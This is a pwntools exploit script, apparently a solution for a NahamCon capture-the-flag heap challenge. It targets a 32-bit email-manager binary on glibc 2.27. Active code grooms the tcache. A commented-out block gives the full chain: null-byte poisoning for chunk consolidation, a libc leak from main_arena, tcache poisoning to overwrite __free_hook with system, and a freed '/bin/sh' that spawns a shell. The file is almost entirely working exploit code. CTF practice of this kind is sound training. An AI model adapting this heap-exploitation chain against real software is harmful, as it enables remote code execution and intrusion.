#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 30770 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall_patched')
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 31745)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env={"LD_PRELOAD": libc.path}, aslr=False, gdbscript=gdbscript, *a, **kw)
    else:
        # return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
        return process([exe.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# b *0x56555dbb
# b *0x56555e32
# b *0x565558ab
# b *0x56555be4
# b *0x56555ac0
# continue
c
# c
# c
# c
# c
# c
# c
# c
# c
# c
# c
# c
# c
# c
# c
# c
'''.format(**locals())

# libc6-i386_2.27-3ubuntu1_amd64
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# start x/100i 0x56555590
# start heap x/100wx 0x5655a1a0+8
io = start()

# debug fopen 0x565557ad
# print 0x56555839
# add 0x565558ab
# edit 0x56555ac0
# delete 0x56555be4

def add(idx,len,email):
    io.sendlineafter("-------------------------\n","add")
    io.sendlineafter("add:\n",str(idx))
    io.sendlineafter("length:\n",str(len))
    io.sendlineafter("email:\n",str(email))

def delete(idx):
    io.sendlineafter("-------------------------\n","delete")
    io.sendlineafter("delete:\n",str(idx))

def edit(idx,email):
    io.sendlineafter("-------------------------\n","edit")
    io.sendlineafter("edit:\n",str(idx))
    io.sendafter("email:\n",str(email))

def view_all():
    io.sendlineafter("-------------------------\n","print")
    io.recvline(0)
    out = io.recvline(0)
    arr = []

    while b'Enter' not in out:
        arr.append(out.split(b': ')[-1])
        out = io.recvline(0)
    # print arr
    return arr

# x/300wx 0x5655b180-8
# Prepare free'd chunk size 0x10 for heap struct size 0x10 (contains: email size and email pointer)
add(0, 0x8, 'A'*0x4)
add(1, 0x8, 'A'*0x4)

delete(0)
delete(1)

# tcachebins
# 0x10 [  4]: 0x5655a190 -> 0x5655a1a0 -> 0x5655a170 -> 0x5655a180 <- 0x0

# Prepare target chunk for consolidate
add(0, 0x8c, 'A'*8) # chunk 0
add(1, 0x9c, 'B'*8) # chunk 1
add(2, 0xfc, 'C'*8) # chunk 2

## memenuhi size chunk 2 ke tcachebins
# Fill-up tcachebins (0x88 / 0x101) # chunk 2
for i in range(7):
    add(3+i, 0xfc, 'D'*8)

for i in range(7):
    delete(i+3)

# tcachebins
# 0x88 [  7]: 0x5655aa40 -> 0x5655a930 -> 0x5655a820 -> 0x5655a710 -> 0x5655a600 -> 0x5655a4f0 -> 0x5655a3e0 <- 0x0

## memenuhi size chunk 0 ke tcachebins
# Fill-up tcachebins (0x50 / 0x91) # chunk 0
for i in range(7):
    add(3+i, 0x8c, 'E'*8)

for i in range(7):
    delete(i+3)

# tcachebins
# 0x50 [  7]: 0x5655aea0 -> 0x5655ae10 -> 0x5655ad80 -> 0x5655acf0 -> 0x5655ac60 -> 0x5655abd0 -> 0x5655ab40 <- 0x0
# x/100wx 0x5655b1b0-8
# delete(0) # Chunk(addr=0x5655b1b0, size=0x90, flags=PREV_INUSE)

# #
# # Poisoning nullbyte and set fake prev_size of chunks[1].
# edit(1, b'X'*8 + b'\n' + b'X'*0x8f + p32(0xa0 + 0x90))
# # #
# # Trigger, chunk[0] - chunk[2] will be consolidate.
# delete(2) # Chunk(addr=0x5655b1b0, size=0x230, flags=PREV_INUSE)

# # Create chunks size 0x88 for gaining information leaks
# add(0, 0x8c, 'F'*8 + '\n') # 0x5655bea0
# add(2, 0x8c, 'G'*8 + '\n') # 0x5655be10
# #
# for i in range(4, 10):
#     add(i, 0x8c, 'A'*8 + '\n') # 0x5655bd80, 0x5655bcf0, 0x5655bc60, 0x5655bbd0, 0x5655bb40
# # # 0x5655b1a8
# main_arena   = u32(view_all()[2][:4])
# libc.address = main_arena - 0x1d57d8
# #
# print '[!] LEAK', hex(main_arena)
# print '[!] LIBC ', hex(libc.address)
# #
# # # x/300wx 0x5655b180-8
# delete(0)
# delete(2)
# #
# for i in range(4, 10):
#     delete(i)
# #
# # Create chunks with size 0x200, overlap with chunk[1].
# add(0, 0x200, 'X'*0x10)
# # add(0, 0x190, 'X'*0x90)
# #
# # Free'd chunks[1]
# delete(1)
# #
# # Tcache-poisoing, overwrite tcache FD pointer chunk[1] to __free_hook.
# edit(0, b'A'*0x8c + p32(0x1a1) + p32(libc.sym['__free_hook']))
# #
# # 0xd8 [  1]: 0x5655a240 -> 0x2aa4b8d0 (__free_hook) <- ...

# # Padding and prepare for string "/bin/sh".
# add(1, 0x190, '/bin/sh')
# #
# # Overwrite `__free_hook` to `__libc_system`
# add(2, 0x190, p32(libc.sym['system']))
# #
# # pwndbg> tel &__free_hook 1
# # 00:0000│   0x2aa4b8d0 (__free_hook) -> 0x2a8af2e0 (system) ...
# #
# # Trigger free("/bin/sh") -> system("/bin/sh") !
# delete(1)

io.interactive()
